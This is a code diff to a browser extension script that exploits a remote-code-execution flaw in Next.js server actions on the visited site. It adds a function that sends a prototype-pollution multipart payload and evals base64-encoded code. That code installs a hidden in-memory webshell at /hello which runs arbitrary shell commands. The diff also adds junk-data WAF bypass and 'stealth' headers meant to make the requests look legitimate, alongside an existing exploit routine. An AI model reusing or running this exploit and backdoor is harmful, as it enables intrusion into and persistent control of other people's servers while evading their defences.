@@ -63,6 +63,219 @@ function generateJunkData(sizeBytes) {
     return { paramName, junk };
 }
 
+// === Memory Shell Deployment ===
+async function deployMemoryShell(wafEnabled) {
+    try {
+        // Get current path from URL
+        const currentPath = window.location.pathname || '/en';
+        const targetUrl = new URL(currentPath, window.location.href).href;
+        
+        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
+        
+        // WAF bypass kontrolü - STRICT: sadece tam olarak true ise junk data ekle
+        const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
+        console.log('[Memory Shell] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
+        console.log('[Memory Shell] Will add junk data:', shouldAddJunkData);
+        
+        // Memory shell code - webshell style with HTML interface
+        // Note: shell: true enables shell operators like &&, |, ; etc.
+        const memoryShellCode = `(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/hello'){const cmd=p.query.cmd||'';let html='<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WebShell</title><style>body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px;max-width:1200px;margin:0 auto;}h1{color:#4ec9b0;border-bottom:2px solid #4ec9b0;padding-bottom:10px;}form{margin:20px 0;background:#252526;padding:15px;border-radius:5px;}input[type="text"]{width:70%;padding:8px;background:#3c3c3c;border:1px solid #555;color:#d4d4d4;font-size:14px;}input[type="submit"]{width:25%;padding:8px;background:#0e639c;border:none;color:#fff;cursor:pointer;font-size:14px;margin-left:10px;}input[type="submit"]:hover{background:#1177bb;}pre{background:#252526;padding:15px;border-radius:5px;overflow-x:auto;border:1px solid #555;white-space:pre-wrap;word-wrap:break-word;}a{color:#4ec9b0;text-decoration:none;}a:hover{text-decoration:underline;}.info{background:#252526;padding:10px;border-radius:5px;margin-top:20px;font-size:12px;color:#858585;border-left:3px solid #4ec9b0;}code{color:#4ec9b0;background:#1e1e1e;padding:2px 6px;border-radius:3px;}</style></head><body><h1>WebShell</h1><form method="GET" action="/hello"><input type="text" name="cmd" value="'+(cmd?cmd.replace(/"/g,'&quot;').replace(/'/g,'&#39;'):'')+'" placeholder="Enter command (e.g., ls -la, cd /home && ls)"><input type="submit" value="Execute"></form>';let currentDir='';if(cmd){try{const result=cp.execSync(cmd,{encoding:'utf8',stdio:'pipe',shell:true});html+='<h2>Output:</h2><pre>'+result.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}catch(err){html+='<h2>Error:</h2><pre style="color:#f48771;">'+err.message.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}try{currentDir=cp.execSync('pwd',{encoding:'utf8',stdio:'pipe',shell:true}).trim();}catch(e){currentDir=process.cwd();}}else{currentDir=process.cwd();}html+='<div class="info"><a href="/hello">Clear</a> | <strong>Current Directory:</strong> <code>'+currentDir.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</code></div></body></html>';s.writeHead(200,{'Content-Type':'text/html;charset=utf-8'});s.end(html);return true;}}return o.apply(this,arguments);};})();`;
+        
+        // Encode memory shell code to base64
+        const memoryShellBase64 = btoa(unescape(encodeURIComponent(memoryShellCode)));
+        
+        // Create payload that decodes base64 and executes the memory shell
+        // Format matches the working base64 command execution example
+        const prefixPayload = `var shellCode=Buffer.from('${memoryShellBase64}','base64').toString('utf8');eval(shellCode);var res='Memory shell deployed at /hello';throw Object.assign(new Error('x'),{digest: Buffer.from(res).toString('base64')});`;
+        
+        // Build the payload with proper JSON structure matching the working example
+        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
+        
+        // Build multipart form data
+        const parts = [];
+        
+        // WAF bypass: Add junk data part first (ONLY if wafEnabled is true)
+        if (shouldAddJunkData) {
+            const wafBypassSizeKb = 128;
+            const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
+            parts.push(
+                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
+                `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
+                `${junk}\r\n`
+            );
+        }
+        
+        // Add part0
+        parts.push(
+            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
+            `Content-Disposition: form-data; name="0"\r\n\r\n` +
+            `${part0}\r\n`
+        );
+        
+        // Add part1
+        parts.push(
+            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
+            `Content-Disposition: form-data; name="1"\r\n\r\n` +
+            `"$@0"\r\n`
+        );
+        
+        // Add part2
+        parts.push(
+            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
+            `Content-Disposition: form-data; name="2"\r\n\r\n` +
+            `[]\r\n`
+        );
+        
+        // Add closing boundary
+        parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
+        
+        const bodyParts = parts.join('');
+        
+        console.log('[Content] Deploying memory shell to:', targetUrl);
+        
+        // Make request using XMLHttpRequest - stealth mode with normal browser headers
+        const makeRequest = (url) => {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                
+                // Normal browser headers first (to look like legitimate request)
+                xhr.setRequestHeader('Accept', '*/*');
+                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
+                xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
+                xhr.setRequestHeader('Referer', window.location.href);
+                xhr.setRequestHeader('Origin', window.location.origin);
+                xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
+                xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
+                xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
+                
+                // Next.js specific headers (required for RSC)
+                xhr.setRequestHeader('Next-Action', 'x');
+                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
+                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
+                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
+                
+                xhr.onload = () => {
+                    resolve({
+                        status: xhr.status,
+                        statusText: xhr.statusText,
+                        responseText: xhr.responseText,
+                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
+                        getResponseHeader: (name) => xhr.getResponseHeader(name)
+                    });
+                };
+                
+                xhr.onerror = () => {
+                    reject(new Error('Network request failed'));
+                };
+                
+                xhr.send(bodyParts);
+            });
+        };
+        
+        let res = await makeRequest(targetUrl);
+        const statusCode = res.status;
+        const responseText = res.responseText || '';
+        
+        console.log('[Content] Memory shell response status:', statusCode);
+        console.log('[Content] Memory shell response text length:', responseText.length);
+        console.log('[Content] Memory shell response text:', responseText);
+        
+        // Parse response to check for digest (indicates payload execution)
+        // Response format: 1:E{"digest":"base64string"}
+        // Try multiple patterns to find digest
+        let digestMatch = responseText.match(/"digest"\s*:\s*"([^"]+)"/);
+        if (!digestMatch) {
+            // Try with escaped quotes
+            digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
+        }
+        
+        if (digestMatch && digestMatch[1]) {
+            try {
+                // Decode base64 digest
+                let rawBase64 = digestMatch[1];
+                console.log('[Content] Raw digest base64:', rawBase64);
+                
+                // Handle JSON string escape sequences if needed
+                let cleanBase64 = rawBase64;
+                try {
+                    cleanBase64 = JSON.parse(`"${rawBase64}"`);
+                } catch (e) {
+                    // If JSON parse fails, use raw value
+                    cleanBase64 = rawBase64;
+                }
+                
+                // Decode base64 to string
+                const decodedStr = new TextDecoder().decode(
+                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
+                );
+                
+                console.log('[Content] Memory shell deployment response (decoded):', decodedStr);
+                
+                // If we get a digest response, the payload was executed
+                // The memory shell should be deployed at /hello
+                const shellPath = '/hello';
+                const shellUrl = new URL(shellPath, window.location.origin).href;
+                
+                return {
+                    success: true,
+                    shellPath: shellPath,
+                    fullUrl: shellUrl,
+                    statusCode: statusCode,
+                    message: decodedStr
+                };
+            } catch (parseError) {
+                console.log('[Content] Failed to parse digest:', parseError);
+                console.log('[Content] Error details:', parseError.message);
+                console.log('[Content] Raw digest value:', digestMatch[1]);
+            }
+        } else {
+            console.log('[Content] No digest found in response');
+        }
+        
+        // Check for success - memory shell is deployed if request succeeds
+        // The shell will be available at /hello?cmd=<command>
+        // Note: Even 500 errors might indicate the shell was deployed (error during execution)
+        if (statusCode >= 200 && statusCode < 300) {
+            const shellPath = '/hello';
+            const shellUrl = new URL(shellPath, window.location.origin).href;
+            
+            return {
+                success: true,
+                shellPath: shellPath,
+                fullUrl: shellUrl,
+                statusCode: statusCode
+            };
+        } else if (statusCode === 500) {
+            // 500 error might still mean the shell was deployed
+            // The error could be from the payload execution itself
+            const shellPath = '/hello';
+            const shellUrl = new URL(shellPath, window.location.origin).href;
+            
+            return {
+                success: true,
+                shellPath: shellPath,
+                fullUrl: shellUrl,
+                statusCode: statusCode,
+                note: 'Deployed (500 error may indicate payload execution)'
+            };
+        } else {
+            return {
+                success: false,
+                msg: `Memory shell deployment failed. Status: ${statusCode}. Response: ${responseText.substring(0, 200)}`,
+                statusCode: statusCode
+            };
+        }
+        
+    } catch (e) {
+        console.log('[Content] Memory shell deployment error:', e);
+        return {
+            success: false,
+            msg: "Network/Request Error: " + e.message
+        };
+    }
+}
+
 // === 3. RCE 漏洞利用 ===
 async function performExploit(cmd, wafEnabled) {
     // 默认命令
@@ -143,16 +356,27 @@ async function performExploit(cmd, wafEnabled) {
         // Use XMLHttpRequest for better network tab visibility in Firefox
         console.log('[Content] Sending exploit request to:', targetUrl);
         
-        // Helper function to make XHR request (XMLHttpRequest appears in network tab)
+        // Helper function to make XHR request - stealth mode with normal browser headers
         const makeRequest = (url) => {
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', url, true);
-                // Note: User-Agent cannot be set in XMLHttpRequest (browser controlled)
+                
+                // Normal browser headers first (to look like legitimate request)
+                xhr.setRequestHeader('Accept', '*/*');
+                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
+                xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
+                xhr.setRequestHeader('Referer', window.location.href);
+                xhr.setRequestHeader('Origin', window.location.origin);
+                xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
+                xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
+                xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
+                
+                // Next.js specific headers (required for RSC)
                 xhr.setRequestHeader('Next-Action', 'x');
                 xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
-                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                 xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
+                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                 
                 xhr.onload = () => {
                     resolve({
@@ -309,5 +533,13 @@ browserAPI.runtime.onMessage.addListener((req, sender, sendResponse) => {
     if (req.action === "get_last_request") {
         sendResponse(lastRequestData);
         return false;
+    }
+    if (req.action === "deploy_memory_shell") {
+        // wafEnabled değerini direkt olarak geçir - message'dan gelen değeri olduğu gibi kullan
+        console.log('[Content] Received memory shell message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
+        deployMemoryShell(req.wafEnabled).then(res => {
+            sendResponse(res);
+        });
+        return true;
     }
 });
